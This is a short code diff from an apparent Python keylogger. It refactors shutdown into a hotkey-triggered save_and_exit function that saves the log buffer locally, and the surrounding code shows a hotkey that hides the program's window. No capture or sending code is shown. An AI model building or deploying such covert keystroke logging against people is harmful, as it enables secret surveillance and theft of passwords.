@@ -342,6 +342,15 @@ def hide():
         return True
     return False
 
+def save_and_exit():
+    if config.get_output() == "local":
+        if not log_local() and visible:
+            print("Something went wrong while saving!")
+    if visible:
+        print(LOGGER_NAME + " stopped.")
+    keyboard.unhook_all()
+    os._exit(0)
+
 
 def main():
     global visible
@@ -362,13 +371,8 @@ def main():
     # To toggle visibillity of window (ctrl + alt + v)
     keyboard.add_hotkey(config.get_visible_hotkey(), hide)
     # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
-    keyboard.wait(config.get_exit_hotkey()) 
-    if config.get_output() == "local":
-        if not log_local() and visible:
-            print("Something went wrong while saving!")
-    if visible:
-        print(LOGGER_NAME + " stopped.")
-    exit()
+    keyboard.add_hotkey(config.get_exit_hotkey(), save_and_exit)
+    keyboard.wait() 
 
 if __name__ == '__main__':
     # Read the configurarion
